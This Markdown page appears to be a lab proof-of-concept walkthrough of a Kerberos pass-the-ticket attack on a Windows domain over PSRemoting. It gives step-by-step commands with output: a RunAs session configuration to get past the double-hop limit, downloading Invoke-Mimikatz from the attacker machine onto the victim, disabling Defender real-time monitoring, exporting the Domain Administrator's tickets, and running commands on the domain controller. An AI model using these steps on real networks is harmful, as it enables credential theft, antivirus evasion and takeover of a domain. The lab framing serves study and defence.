---
layout: default
title: "Double Hop Bypass"
description: "The double-hop problem occurs when, for example, a local PowerShell instance connected via PSRemoting to a remote server which is connected to the target server and an attempt to execute commands on the target server was made and was rejected. The end goal of this proof-of-concept is to execute a pass-the-ticket attack on an active directory while being remotely connected to a domain computer with administrator privileges."
tags: [windows, pass the ticket, PTT, krbtgt, klist, double hop, double hop bypass, multi hop, multihop, bypass, mimikatz, exploitation]
---

# Pass-the-Ticket over PSRemoting using Invoke-Mimikatz

## ENVIRONMENT SET-UP:
#### MACHINES:

HOSTNAME | MACHINE IP | OS | Description
--- | --- | --- | ---
KALI-WINDOWS | 192.168.150.1 | Windows 10 | An attacker machine
MSEDGEWIN10 | 192.168.150.128 | Windows 10 Enterprise Evaluation| A Remote Machine
BOSSMANBEN | 192.168.150.133 | Windows Server 2016 | A Domain Controller

#### USERS:

USER | MACHINE | PRIVILEGES
--- | --- | ---
kali-windows\\jebidiah | kali-windows | Local Administrator
BOSSMANBEN\\GConcy | MSEDGEWIN10 | Local Administrator; Domain User
BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator

---

## ASSUMPTIONS:

#### i. WinRM is enabled on both local and remote machines
1. Both machines IPs are listed in each other's trustedhosts
2. `-skipnetworkprofilecheck` is enabled (to allow connection over a public network)
3. Proper firewall exceptions are in place in the remote machine

#### ii. The remote machine is part of a Domain Controller (BOSSMANBEN)
1. A domain user is a local administrator to the remote machine
2. Credentials to the said domain user are known

#### iii. The Domain Administrator has logged in to the remote machine (MSEDGEWIN10)
1. The logon action generates a ticket for the Domain Administrator
2. The TGT expires over a definite period of time (6 hours in this case)
3. Pass-the-Ticket could be done as long as the TGT hasn't expired yet

#### iv. The local machine (KALI-WINDOWS) can communicate with the remote machine (MSEDGEWIN10)

---

## EXPLOITATION:

#### i. Establish a session using PSRemoting
1. Enter a session for the domain user, __BOSSMANBEN\\GConcy__:
   ```ps1
   Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy
   ```
   __NOTE(S)__:
   - Enter the credentials for BOSSMANBEN\GConcy in the password prompt

2. Check for cached tickets using `klist`:
   ```
   Current LogonId is 0:0xc7fbc
   Error calling API LsaCallAuthenticationPackage (ShowTickets substatus): 1312

   klist failed with 0xc000005f/-1073741729: A specified logon session does not exist. It may already have been terminated.
   ```
   __NOTE(S)__:
   - The current established session doesn't seem to be a __*recognized*__ session.

3. Register the current session while inside the PSSession created:
   ```ps1
   Register-PSSessionConfiguration -Name GodConcy -RunAsCredential BOSSMANBEN\GConcy
   ```
   ```
   WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce a security 
   boundary between different user sessions that are created by using this endpoint. Verify that the Windows PowerShell runspace 
   configuration is restricted to only the necessary set of cmdlets and capabilities.
   WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has recently been 
   unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be required.
   All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session configurations that 
   are created with the Register-PSSessionConfiguration cmdlet, are disconnected.


   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

   Type            Keys                                Name
   ----            ----                                ----
   Container       {Name=GodConcy}                     GodConcy
   ...omitted...
   ```

   ```ps1
   Get-PSSessionConfiguration
   ```
   ```
   Name          : GodConcy
   PSVersion     : 5.1
   StartupScript :
   RunAsUser     : BOSSMANBEN\GConcy
   Permission    : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
   
   ...omitted...
   ```
   __NOTE(S)__:
   - Enter the credentials for BOSSMANBEN\GConcy in the password prompt

4. Run `klist` again:
   ```
   Current LogonId is 0:0xc7fbc

   Cached Tickets: (0)
   ```
   __NOTE(S)__:
   - `klist` can now check for cached tickets
   - Passing exported tickets using `Invoke-Mimikatz` would throw the same error from the previous `klist` if a proper session is not configured.
   - Even if an Administrator ticket was passed successfully, passing commands in or accessing the Domain Controller would be denied
     - The entire session should be restarted with the proper configuration.

5. Type `Restart-Service WinRM` then enter a new PSSession with the registered configuration:
   ```ps1
   Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy -ConfigurationName GodConcy
   ```
   __NOTE(S)__:
   - The shell will terminate after restarting the service.
   - Enter the credentials for BOSSMANBEN\GConcy in the password prompt

6. Run `klist` again:
   ```
   Current LogonId is 0:0xd0ebf

   Cached Tickets: (1)

   #0>     Client: GConcy @ BOSSMANBEN.LOCAL
           Server: krbtgt/BOSSMANBEN.LOCAL @ BOSSMANBEN.LOCAL
           KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
           Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
           Start Time: 7/12/2019 15:42:59 (local)
           End Time:   7/13/2019 1:42:59 (local)
           Renew Time: 7/19/2019 15:42:59 (local)
           Session Key Type: AES-256-CTS-HMAC-SHA1-96
           Cache Flags: 0x1 -> PRIMARY
           Kdc Called: WIN-BO2CT95INDP
   ```
   __NOTE(S)__:
   - The session now actually runs as the user, __BOSSMANBEN\\GConcy__
   - This session now eliminates the __double hop__ problem:
     - Instead of the local machine sending a request to the remote machine before reaching the server, the local machine is now acting as or impersonating the remote machine running as the user __BOSSMANBEN\\GConcy__.
     - Since the local machine (KALI-WINDOWS) now acts like the remote machine (MSEDGEWIN10), it would seem like the requests sent from the local machine are now going directly to the Domain Controller (BOSSMANBEN).
     - The two previous statement would be useful since the goal of this exploit is to reach the Domain Controller (BOSSMANBEN) using the local machine (KALI-WINDOWS) "without jumping" from the remote machine (MSEDGEWIN10)

#### ii. Export krbtgt tickets using Invoke-Mimikatz:

1. Download the exploit to the local machine (KALI-WINDOWS):
   ```ps1
   git clone https://github.com/samratashok/nishang

   cd .\nishang\Gather
   ```

2. Upload __Invoke-Mimikatz.ps1__ to the remote machine (MSEDGEWIN10):
   - LOCAL MACHINE (KALI-WINDOWS):
     ```sh
     python -m SimpleHTTPServer
     ```
   - PSSession (MSEDGEWIN10):
     ```ps1
     cd $home\Desktop

     Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1
     ```

3. Use dot source to import  __Invoke-Mimikatz__:
   - PSSession (MSEDGEWIN10):
     ```
     Set-MpPreference -DisableRealtimeMonitoring $true

     . .\Invoke-Mimikatz.ps1
     ```
     __NOTE(S)__:
     - `-DisableRealtimeMonitoring $true` prevents the remote machine from detecting __Invoke-Mimikatz.ps1__ as a malicious script
     
4. Export __*krbtgt tickets*__ using Invoke-Mimikatz:
   - PSSession (MSEDGEWIN10):
     ```ps1
     mkdir tickets

     cd tickets

     Invoke-Mimikatz -command '"sekurlsa::tickets /export"'
     ```
     ```
       .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
      .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
      ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
      ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
      '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
       '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

     mimikatz(powershell) # sekurlsa::tickets /export

     ...omitted...

     Authentication Id : 0 ; 303469 (00000000:0004a16d)
     Session           : Interactive from 1
     User Name         : Administrator
     Domain            : BOSSMANBEN
     Logon Server      : WIN-BO2CT95INDP
     Logon Time        : 7/12/2019 4:37:50 PM
     SID               : S-1-5-21-2817836110-3135048609-2922248965-500

             * Username : Administrator
             * Domain   : BOSSMANBEN.LOCAL
             * Password : (null)

            Group 0 - Ticket Granting Service
             [00000000]
               Start/End/MaxRenew: 7/12/2019 4:38:17 PM ; 7/13/2019 2:38:17 AM ; 7/19/2019 4:38:17 PM
               Service Name (02) : LDAP ; WIN-BO2CT95INDP.bossmanben.local ; bossmanben.local ; @ BOSSMANBEN.LOCAL
               Target Name  (02) : LDAP ; WIN-BO2CT95INDP.bossmanben.local ; bossmanben.local ; @ BOSSMANBEN.LOCAL
               Client Name  (01) : Administrator ; @ BOSSMANBEN.LOCAL ( BOSSMANBEN.LOCAL )
               Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
               Session Key       : 0x00000012 - aes256_hmac
                 4050506d21e637246324747b2d8a26a69a195020adc6bb715f19441a80075302
               Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
               * Saved to file [0;4a16d]-0-0-40a50000-Administrator@LDAP-WIN-BO2CT95INDP.bossmanben.local.kirbi !

            Group 1 - Client Ticket ?

            Group 2 - Ticket Granting Ticket
             [00000000]
               Start/End/MaxRenew: 7/12/2019 4:38:17 PM ; 7/13/2019 2:38:17 AM ; 7/19/2019 4:38:17 PM
               Service Name (02) : krbtgt ; BOSSMANBEN.LOCAL ; @ BOSSMANBEN.LOCAL
               Target Name  (02) : krbtgt ; BOSSMANBEN ; @ BOSSMANBEN.LOCAL
               Client Name  (01) : Administrator ; @ BOSSMANBEN.LOCAL ( BOSSMANBEN )
               Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
               Session Key       : 0x00000012 - aes256_hmac
                 0d397fbecc40d64ac4c5852da47f10f9f757b2db4beaef1e8cdd2bb911ab8605
               Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
               * Saved to file [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi !
    
     ...omitted...
     ```
     __NOTE(S)__:
     - A krbtgt ticket for the Domain (BOSSMANBEN.LOCAL) Administrator was exported

#### iii. Pass the ticket using Invoke-Mimikatz

1. View the exported tickets:
   ```ps1
   dir $home\Desktop\tickets
   ```
   ```
   ...omitted...
   -a----       12/07/2019   4:53 PM           1611 [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi
   ...omitted...
   ```
2. Pass the krbtgt ticket:
   ```ps1
   Invoke-Mimikatz -command '"kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi"'
   ```
   ```
     .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
     '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

   mimikatz(powershell) # kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi

   * File: '[0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi': OK
   ```
3. View the cached tickets using `klist`:
   ```
   Current LogonId is 0:0xd0ebf

   Cached Tickets: (1)

   #0>     Client: Administrator @ BOSSMANBEN.LOCAL
           Server: krbtgt/BOSSMANBEN.LOCAL @ BOSSMANBEN.LOCAL
           KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
           Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
           Start Time: 7/12/2019 16:38:17 (local)
           End Time:   7/13/2019 2:38:17 (local)
           Renew Time: 7/19/2019 16:38:17 (local)
           Session Key Type: AES-256-CTS-HMAC-SHA1-96
           Cache Flags: 0x1 -> PRIMARY
           Kdc Called:
   ```
   __NOTE(S)__:
   - The current ticket for the session is now `Administrator @ BOSSMANBEN.LOCAL` which is a Domain Administrator
   - The current PSSession should now be able to impersonate the Domain Administrator
4. Check if the Domain Controller (BOSSMANBEN) now accessible:
   - Get the Primary Domain Controller for BOSSMANBEN:
     ```ps1
     nltest /DCNAME:BOSSMANBEN
     ```
     ```
     PDC for Domain BOSSMANBEN is \\WIN-BO2CT95INDP
     The command completed successfully
     ```
   - List contents of the file share, `C$`:
     ```ps1
     dir \\WIN-BO2CT95INDP\C$
     ```
     ```
   
         Directory: \\WIN-BO2CT95INDP\C$


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     d-----       16/07/2016   6:23 AM                PerfLogs
     d-r---       09/07/2019   3:01 PM                Program Files
     d-----       16/07/2016   6:23 AM                Program Files (x86)
     d-r---       09/07/2019   3:01 PM                Users
     d-----       09/07/2019   3:10 PM                Windows
     -a----       11/07/2019  12:53 PM              5 gg

     ```
   - Pass commands as the Domain Administrator:
     ```ps1
     Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }
     ```
     ```
     bossmanben\administrator
     ```
   __NOTE(S)__:
   - The file shares in the Domain Controller (BOSSMANBEN) are now accessible as long as the Domain Controller is being accessed using kerberos authentication.
   - Commands could also now be executed in the context of the Domain Controller (BOSSMANBEN) using the `Invoke-Command` module in PowerShell.
